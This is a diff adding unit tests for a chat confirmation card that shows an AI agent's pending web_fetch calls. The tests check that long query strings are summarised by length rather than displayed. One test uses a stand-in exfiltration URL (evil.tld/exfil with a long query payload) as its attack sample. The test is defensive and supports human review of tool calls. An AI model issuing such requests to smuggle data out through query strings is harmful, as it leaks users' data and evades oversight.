@@ -104,3 +104,44 @@ describe("ConfirmCard 确认卡", () => {
     ).toBeInTheDocument();
   });
 });
+
+describe("ConfirmCard web_fetch 族(评审 A2-2)", () => {
+  it("链接只展示 host+路径,查询串另起一行报长度且不逐字展示", () => {
+    renderCard({
+      name: "web_fetch",
+      args: { url: `https://evil.tld/exfil?k=${"x".repeat(312)}` },
+    });
+    expect(
+      screen.getByRole("alertdialog", { name: zhCN.chat.confirmWebFetchTitle }),
+    ).toBeInTheDocument();
+    // 路径完整、查询串整体省略 → host+路径 + 省略号
+    expect(
+      screen.getByText(zhCN.chat.confirmWebFetchUrl.replace("{url}", "evil.tld/exfil…")),
+    ).toBeInTheDocument();
+    // search = "?k=" + 312 个 x → 参数 314 字符
+    expect(
+      screen.getByText(zhCN.chat.confirmWebFetchQuery.replace("{n}", "314")),
+    ).toBeInTheDocument();
+    // 负载本体不出现在卡片任何位置
+    expect(screen.queryByText(/x{40}/)).not.toBeInTheDocument();
+  });
+
+  it("无查询串的短路径链接不加省略号也不出查询串行", () => {
+    renderCard({
+      name: "web_fetch",
+      args: { url: "https://example.com/a/b" },
+    });
+    expect(
+      screen.getByText(zhCN.chat.confirmWebFetchUrl.replace("{url}", "example.com/a/b")),
+    ).toBeInTheDocument();
+    expect(screen.queryByText(/查询串/)).not.toBeInTheDocument();
+  });
+
+  it("无法解析的 url 原样截断展示(不崩,由工具自身报错)", () => {
+    renderCard({ name: "web_fetch", args: { url: "::not-a-url::" } });
+    // 解析失败走原始串分支,截断语义缺省 → 带省略号
+    expect(
+      screen.getByText(zhCN.chat.confirmWebFetchUrl.replace("{url}", "::not-a-url::…")),
+    ).toBeInTheDocument();
+  });
+});
